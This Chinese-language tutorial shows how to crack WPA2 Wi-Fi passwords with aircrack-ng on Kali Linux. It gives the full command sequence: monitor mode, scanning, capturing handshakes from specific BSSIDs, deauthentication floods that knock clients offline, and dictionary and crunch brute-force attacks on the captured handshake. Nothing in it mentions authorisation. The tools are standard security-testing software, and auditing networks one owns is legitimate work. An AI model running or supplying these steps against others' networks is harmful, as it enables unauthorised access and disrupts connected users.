[Aircrack-ng 官网资料](http://www.aircrack-ng.org/doku.php?id=airmon-ng)

```bash
# airmon-ng 开启监听模式
$ airmon-ng start wlan0

# airodump-ng 扫描周围 WiFi 网络
$ airodump-ng wlan0mon -a

$ bssid=D4:84:09:7B:A5:7A
$ client=84:46:93:D7:97:81
$ ch=6

# airodump-ng 开始抓包
# airodump-ng -c {CH} --bssid {BSSID} -w {要保存握手包的目录} {无线网卡名称}
$ airodump-ng -c $ch --bssid $bssid -w ./25 wlan0mon


# 强制重连
# aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址(STATION下面的地址)} {无线网卡名称}
aireplay-ng -0 10 -a $bssid -c $client wlan0mon
```

## 准备

linux 系统：

- 安装 kali 系统（自带 aircrack-ng 套件）
- 其他的 linux 系统如 ubuntu 要手动安装 aircrack-ng 套件

```bash
sudo apt install aircrack-ng
```

网卡：不是随便的网卡就行，一定要看看网卡芯片支持 aircrack-ng 与否。

- 虚拟机 vm 之类的：要购买外置的 usb 无线网卡，并安装驱动。
  [usb 无线网卡](https://blog.csdn.net/sandalphon4869/article/details/104214781)
  
- 双系统可以使用本机网卡，但要看看支持 aircrack-ng 吗，比如我的 Realtek 8821ce 就不支持。

  【最好的方式，Kali USB Live，即插即用，可本机网卡】


## 原理

破解的原理还是**一个一个试**，之所以要抓握手包，是因为握手包中含有经过加密的密码，我们将握手包抓下来后，可以**在本地跑字典破解**，并且每秒钟可以试几万个密码。

但是如果没有握手包，我们只能手动输密码，那样是很慢的，即使可以用程序来跑，也不能保证路由器没有设置错误次数，有可能会禁止连接，即使没有设置错误次数，但是每次与路由器交互的过程所需要耗费的时间也大于一秒。

aircrack-ng 套件：

核心

- `airmon-ng`：设置网卡的工作模式，
- `airodump-ng`：扫描无线网络抓取数据包
- `aircrack-ng`：可以进行密码的试探，把 cap 数据包转换为 hashcat 文件，用它可以提高十倍以上的破解速度

其他：

- `aireplay-ng`：生成流量和客户端认证

## 监听模式 airmon-ng

先获取 root 权限：

```bash
sudo su
```

### 查看网卡是否支持

```bash
airmon-ng
```

![0.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814074.png)
显示物理设备，接口，驱动，芯片型号。

如果你也安装好了网卡驱动，结果却空空如也，说明你的网卡不支持监听，买个吧。

### 开启监听模式

```bash
airmon-ng start wlan0
```

![1.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814075.png)
记住显示出来的`wlan0mon`

### 查看是否进入监听模式

```bash
iwconfig
```

![2.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814076.png)
可以看到`wlan0mon`的信息：协议、模式、频率

## 扫描网络 airodump-ng

```bash
# -a 过滤掉隐藏bssid的station。反正不知道bssid也没法用。
# --channel <channels>: 默认是2.4G，可设置5G频段来扫5G
airodump-ng wlan0mon -a --channel 1-140
```

![3.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814077.png)

第一个列表：无线网络 AP：

- BSSID: 无线 AP 的硬件地址
- PWR: 信号强度，值是负数，越大表示信号越强
- CH: 无线网络信道
- ENC: 加密方式，我们要破解的是 WPA2
- CIPHER：加密算法。一般，TKIP 与 WPA、CCMP 与 WPA2.
- ESSID: 无线网络的名称

第二个列表：无线网络 AP 中的用户设备：

- BSSID: 无线 AP 的硬件地址
- STATION: 用户设备的硬件地址（mac 地址）
- Probe：无线网络 AP的备注。

按键：

- a: 选择不同显示模式。不用动，就默认模式
- o/p: 开启/关闭**颜色标注**。标准有设备的无线网络AP。
- s: 排序规则。我们选择 **sorting by power level**

### 开始抓包 airodump-ng

```bash
# airodump-ng -c {CH} --bssid {BSSID} -w {包文件路径前缀} {无线网卡名称}
airodump-ng -c 6 --bssid 5C:02:14:A4:38:50 -w /home/kali/Desktop/23 wlan0mon
airodump-ng -c 8 --bssid 50:55:8D:C0:14:5F -w /home/kali/Desktop/cmcc wlan0mon


┌──(root㉿kali)-[/home/kali/Desktop]
└─# ls   
23-01.cap  23-01.csv  23-01.kismet.csv  23-01.kismet.netxml  23-01.log.csv
```

### 强制断开 aireplay-ng（可选）

在抓取期间，如果有设备重新链接到这个 wifi，那么才能获取到握手包。

这条作用就是让已经链接上的设备断开重连。

```bash
# aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址(STATION)} {无线网卡名称}
aireplay-ng -0 5 -a 5C:02:14:A4:38:50 -c 46:96:65:7D:6C:FB wlan0mon

# 省去 -c 就是广播。
aireplay-ng -0 5 -a 50:55:8D:C0:14:5F  wlan0mon

# -0 0: 无限包
aireplay-ng -0 0 -a D4:35:38:BD:4C:99 wlan0mon
```

问题：拿自己wifi实验，都没断开成功……

### 握手成功

![4.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814078.png)
只有当扫描状态后面出现`][ WPA handshake: 22:47:DA:62:2A:F0`后，我们才拿到拿到进行破解的握手包

按 Ctrl-C 结束抓包。

![5.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814079.png)

进到（1）中`{要保存握手包的目录}`下查看握手包，其中"-01.cap"是我们一会儿破解要用到的数据包

## 开始破解密码 aircrack-ng

### 解压字典

如果是 kali 的话，可以使用本地字典：

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

其他的 linux，可以下别的字典：
[github:conwnet/wpa-dictionary](https://github.com/conwnet/wpa-dictionary)

### 本地

命令格式：
`aircrack-ng -w {本地的字典文件} {握手包}`

例如：

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/volume/pro/-01.cap
```

![6.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814080.png)

### crunch 在线

- 知道 ESSID（即 WiFi 的名字，如`360Wifi-A00000`）
  8 位密码：随机数字（`-e`表示 Wifi 的 ESSID，`-w -`表示使用 crunch 即时生成的密码本）

```bash
crunch 8 8 0123456789 | aircrack-ng yourCapName.cap -e yourWifiESSID -w -
```

- 知道 BSSID（即 Mac 地址，如`00:00:00:00:00:00`）
  8 位密码：随机数字（`-b`表示 Wifi 的 BSSID，`-w -`表示使用 crunch 即时生成的密码本）

```bash
crunch 8 8 0123456789 | aircrack-ng yourCapName.cap -b yourWifiBSSID -w -
```

## 退出

使用命令：


```
airmon-ng stop wlan0mon
```



---

## 参考

[kali linux 破解 WiFi 教程- 影像声色](https://www.jianshu.com/p/15f5c51143ec)
[kali 破解 wifi 密码-fzga](https://www.cnblogs.com/zgang/p/11562012.html)

[WLAN traffic capture [2\] - Linux - NetGab - The daily networking madness](http://netgab.net/web/2016/12/23/wlan-traffic-capture-2-linux/)
